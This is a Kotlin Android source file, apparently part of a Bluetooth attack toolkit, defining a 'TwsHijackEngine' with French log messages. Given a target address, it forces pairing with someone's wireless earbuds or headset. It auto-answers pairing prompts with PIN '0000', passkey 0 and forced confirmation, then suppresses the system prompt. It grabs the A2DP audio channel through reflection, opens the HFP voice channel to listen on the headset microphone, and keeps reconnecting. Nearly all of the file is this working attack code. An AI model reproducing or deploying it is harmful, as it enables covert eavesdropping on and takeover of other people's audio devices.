package com.droid.dolphy.bluetooth.whisperpair

import android.annotation.SuppressLint
import android.bluetooth.BluetoothA2dp
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import androidx.core.content.ContextCompat
import kotlin.coroutines.coroutineContext
import kotlinx.coroutines.*

class TwsHijackEngine(private val context: Context) {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var job: Job? = null

    @Volatile
    private var isRunning = false

    @Volatile
    private var hfpConnected = false

    private var targetDevice: BluetoothDevice? = null
    private var a2dpProfile: BluetoothA2dp? = null
    private var pairingReceiver: BroadcastReceiver? = null

    private val audioManager = BluetoothAudioManager(context)

    private val adapter: BluetoothAdapter?
        get() = (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter

    fun hijack(address: String, onLog: (String) -> Unit) {
        if (isRunning) return
        isRunning = true
        job = scope.launch { run(address, onLog) }
    }

    fun stop() {
        isRunning = false
        job?.cancel()
        job = null
        unregisterPairingReceiver()
        runCatching { audioManager.stopListening() }
        runCatching { audioManager.disconnect() }
        runCatching { audioManager.release() }
        targetDevice?.let { d ->
            runCatching {
                a2dpProfile?.let { a2dp ->
                    BluetoothA2dp::class.java
                        .getMethod("disconnect", BluetoothDevice::class.java)
                        .invoke(a2dp, d)
                }
            }
        }
        runCatching {
            a2dpProfile?.let { adapter?.closeProfileProxy(BluetoothProfile.A2DP, it) }
        }
        a2dpProfile = null
        targetDevice = null
    }

    private suspend fun post(onLog: (String) -> Unit, message: String) {
        withContext(Dispatchers.Main) { onLog(message) }
    }

    @SuppressLint("MissingPermission")
    private suspend fun run(address: String, onLog: (String) -> Unit) {
        val safeLog: (String) -> Unit = { msg -> if (isRunning) scope.launch { post(onLog, msg) } }

        val adapter = adapter
        if (adapter == null || !adapter.isEnabled) {
            post(onLog, "Bluetooth non disponible")
            isRunning = false
            return
        }
        val device = runCatching { adapter.getRemoteDevice(address) }.getOrNull()
        if (device == null) {
            post(onLog, "Adresse d'appareil invalide")
            isRunning = false
            return
        }
        targetDevice = device

        safeLog("Cible : ${runCatching { device.name }.getOrNull() ?: "appareil"} [$address]")
        runCatching { adapter.cancelDiscovery() }
        registerPairingReceiver(device, safeLog)

        if (!ensureBonded(device, safeLog)) {
            isRunning = false
            return
        }

        safeLog("A2DP : connexion du canal audio...")
        val a2dp = awaitA2dpProxy(adapter)
        if (a2dp != null) {
            val started = connectA2dpReflect(a2dp, device)
            safeLog(if (started) "A2DP : requête envoyée, attente..." else "A2DP : méthode connect indisponible sur ce firmware")
            if (awaitA2dpConnected(a2dp, device, 12000)) {
                safeLog("A2DP : CANAL AUDIO CONNECTÉ — flux audio routé vers les écouteurs")
            } else {
                safeLog("A2DP : échec de connexion (écouteurs occupés par un autre appareil ?)")
            }
        } else {
            safeLog("A2DP : profil audio indisponible")
        }

        val onHfpState: (BluetoothAudioManager.AudioState) -> Unit = { state ->
            when (state) {
                is BluetoothAudioManager.AudioState.Connected -> {
                    hfpConnected = true
                    safeLog("HFP : CANAL VOCAL CONNECTÉ — micro du casque accessible")
                    runCatching {
                        audioManager.startListening { listenState ->
                            when (listenState) {
                                is BluetoothAudioManager.AudioState.Listening ->
                                    safeLog("MIC : écoute du micro du casque active")
                                is BluetoothAudioManager.AudioState.Error ->
                                    safeLog("MIC : ${listenState.message}")
                                else -> {}
                            }
                        }
                    }
                }
                is BluetoothAudioManager.AudioState.Connecting -> safeLog("HFP : connexion...")
                is BluetoothAudioManager.AudioState.Error -> {
                    hfpConnected = false
                    safeLog("HFP : ${state.message}")
                }
                is BluetoothAudioManager.AudioState.Disconnected -> hfpConnected = false
                else -> {}
            }
        }

        safeLog("HFP : initialisation du profil vocal...")
        if (awaitAudioManagerReady()) {
            audioManager.connectAudioProfile(address, onHfpState)
        } else {
            safeLog("HFP : échec d'initialisation")
        }

        var a2dpRetries = 0
        var hfpRetries = 0
        var lastHfpTry = 0L
        var lastStatus = 0L
        while (coroutineContext.isActive && isRunning) {
            delay(1500)
            val now = System.currentTimeMillis()

            if (a2dp != null) {
                val st = runCatching { a2dp.getConnectionState(device) }.getOrNull()
                if (st != BluetoothProfile.STATE_CONNECTED && st != BluetoothProfile.STATE_CONNECTING) {
                    if (a2dpRetries < 8) {
                        a2dpRetries++
                        safeLog("A2DP : canal perdu — reconnexion $a2dpRetries/8")
                        runCatching { connectA2dpReflect(a2dp, device) }
                    }
                } else {
                    a2dpRetries = 0
                }
            }

            if (!hfpConnected && !audioManager.isHfpConnected(address) &&
                now - lastHfpTry > 10000 && hfpRetries < 5
            ) {
                hfpRetries++
                lastHfpTry = now
                safeLog("HFP : reconnexion $hfpRetries/5")
                audioManager.connectAudioProfile(address, onHfpState)
            }

            if (now - lastStatus > 8000) {
                lastStatus = now
                val a2dpState = runCatching { a2dp?.getConnectionState(device) }.getOrNull()
                safeLog(
                    "Statut : A2DP=${stateName(a2dpState)} · HFP=${if (audioManager.isHfpConnected(address)) "OK" else "non"}",
                )
            }
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun ensureBonded(device: BluetoothDevice, log: (String) -> Unit): Boolean {
        when (runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)) {
            BluetoothDevice.BOND_BONDED -> return true
            BluetoothDevice.BOND_BONDING -> log("Appairage déjà en cours, attente...")
            else -> {
                log("Appairage automatique en cours...")
                val started = runCatching { device.createBond() }.getOrDefault(false)
                if (!started) {
                    log("Échec de l'initialisation de l'appairage")
                    return false
                }
            }
        }
        val deadline = System.currentTimeMillis() + 25000
        while (coroutineContext.isActive && isRunning && System.currentTimeMillis() < deadline) {
            val state = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
            if (state == BluetoothDevice.BOND_BONDED) {
                log("APPAIRÉ")
                return true
            }
            delay(400)
        }
        log("Délai d'appairage dépassé (25s)")
        return false
    }

    @SuppressLint("MissingPermission")
    private fun registerPairingReceiver(target: BluetoothDevice, log: (String) -> Unit) {
        unregisterPairingReceiver()
        pairingReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action != BluetoothDevice.ACTION_PAIRING_REQUEST) return
                val device: BluetoothDevice? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                }
                if (device == null || device.address != target.address) return
                val variant = intent.getIntExtra(
                    BluetoothDevice.EXTRA_PAIRING_VARIANT,
                    BluetoothDevice.ERROR,
                )
                log("Demande d'appairage (variante $variant) — confirmation automatique")
                try {
                    when {
                        variant == BluetoothDevice.PAIRING_VARIANT_PIN || variant == 0 || variant == 7 -> {
                            runCatching { device.setPin("0000".toByteArray(Charsets.UTF_8)) }
                            runCatching {
                                device.javaClass
                                    .getMethod("setPasskey", Int::class.javaPrimitiveType)
                                    .invoke(device, 0)
                            }
                        }
                        else -> {
                            runCatching { device.setPairingConfirmation(true) }
                            runCatching { device.setPin("0000".toByteArray(Charsets.UTF_8)) }
                        }
                    }
                    runCatching { abortBroadcast() }
                } catch (t: Throwable) {
                }
            }
        }
        ContextCompat.registerReceiver(
            context,
            pairingReceiver!!,
            IntentFilter(BluetoothDevice.ACTION_PAIRING_REQUEST),
            ContextCompat.RECEIVER_EXPORTED,
        )
    }

    private fun unregisterPairingReceiver() {
        pairingReceiver?.let { runCatching { context.unregisterReceiver(it) } }
        pairingReceiver = null
    }

    @SuppressLint("MissingPermission")
    private suspend fun awaitA2dpProxy(adapter: BluetoothAdapter): BluetoothA2dp? {
        val deferred = CompletableDeferred<BluetoothA2dp?>()
        val listener = object : BluetoothProfile.ServiceListener {
            override fun onServiceConnected(profile: Int, proxy: BluetoothProfile) {
                a2dpProfile = proxy as? BluetoothA2dp
                deferred.complete(a2dpProfile)
            }

            override fun onServiceDisconnected(profile: Int) {
                a2dpProfile = null
            }
        }
        return runCatching {
            adapter.getProfileProxy(context, listener, BluetoothProfile.A2DP)
            withTimeoutOrNull(6000) { deferred.await() }
        }.getOrNull()
    }

    @SuppressLint("MissingPermission")
    private fun connectA2dpReflect(a2dp: BluetoothA2dp, device: BluetoothDevice): Boolean {
        return runCatching {
            BluetoothA2dp::class.java
                .getMethod("connect", BluetoothDevice::class.java)
                .invoke(a2dp, device) as? Boolean ?: false
        }.getOrDefault(false)
    }

    @SuppressLint("MissingPermission")
    private suspend fun awaitA2dpConnected(a2dp: BluetoothA2dp, device: BluetoothDevice, timeoutMs: Long): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        while (coroutineContext.isActive && isRunning && System.currentTimeMillis() < deadline) {
            val st = runCatching { a2dp.getConnectionState(device) }
                .getOrDefault(BluetoothProfile.STATE_DISCONNECTED)
            if (st == BluetoothProfile.STATE_CONNECTED) return true
            delay(500)
        }
        return false
    }

    private suspend fun awaitAudioManagerReady(): Boolean {
        val deferred = CompletableDeferred<Boolean>()
        runCatching { audioManager.initialize { ready -> deferred.complete(ready) } }
        return withTimeoutOrNull(6000) { deferred.await() } ?: false
    }

    private fun stateName(state: Int?): String = when (state) {
        BluetoothProfile.STATE_CONNECTED -> "CONNECTED"
        BluetoothProfile.STATE_CONNECTING -> "CONNECTING"
        BluetoothProfile.STATE_DISCONNECTING -> "DISCONNECTING"
        BluetoothProfile.STATE_DISCONNECTED -> "DISCONNECTED"
        else -> "?"
    }
}
